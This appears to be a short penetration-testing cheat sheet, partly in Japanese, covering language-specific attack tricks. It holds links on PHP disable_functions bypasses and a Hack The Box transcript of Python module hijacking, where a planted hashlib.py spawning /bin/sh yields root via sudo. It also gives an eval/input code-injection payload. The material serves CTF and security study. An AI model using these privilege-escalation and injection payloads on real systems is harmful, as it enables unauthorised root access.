# language
----

## PHP
* [dangerous functions](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720)
* [ RCE in PHP or how to bypass disable_functions in PHP installations](https://lab.wallarm.com/rce-in-php-or-how-to-bypass-disable_functions-in-php-installations-6ccdbf4f52bb/)
* [Bypassing PHP disable_functions with Chankro](https://0xdf.gitlab.io/2019/08/02/bypassing-php-disable_functions-with-chankro.html)

## Python
* モジュールはsys.pathに従って読み込まれる
* 実行ファイルと同改装のディレクトリに、実行ファイルが読み込むモジュールと同名のモジュールが存在する場合、sys.pathによっては同階層のモジュールが優先して読み込まれる
* またPYTHONPATH環境変数は、通常同階層のモジュールの次に読み込まれる
* sys.pathもしくはPYTHONPATH を利用し、権限昇格が可能な場合が存在する
* Htb: Stratosphere
   ```console
   richard@stratosphere:~$ python -c 'import sys; print(sys.path)'
   ['', '/usr/lib/python35.zip', '/usr/lib/python3.5', '/usr/lib/python3.5/plat-x86_64-linux-gnu', '/usr/lib/python3.5/lib-dynload', '/usr/local/lib/python3.5/dist-packages', '/usr/lib/python3/dist-packages']
   richard@stratosphere:~$ PYTHONPATH='/hoo' python -c 'import sys; print(sys.path)'
   ['', '/hoo', '/usr/lib/python35.zip', '/usr/lib/python3.5', '/usr/lib/python3.5/plat-x86_64-linux-gnu', '/usr/lib/python3.5/lib-dynload', '/usr/local/lib/python3.5/dist-packages', '/usr/lib/python3/dist-packages']
   richard@stratosphere:~$ printf 'import os\nos.system("/bin/sh")\n' > hashlib.py
   richard@stratosphere:~$ sudo /usr/bin/python2.7 /home/richard/test.py
   # id
   uid=0(root) gid=0(root) groups=0(root)
   ```
   
* eval関数やinput関数に任意の文字列を入力可能な場合、次のペイロードが使用可能
  ```python
  __import__("os").system('COMMAND')
  ```

* os.path.join
```python
os.path.join('/hoo', 'bar', '/baz')
# => /baz
```
  
* [Hacking Python Applications](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1)

## Perl
* [Re: The Perl Jam 2](https://kentfredric.github.io/blog/tag/the-perl-jam-2/)

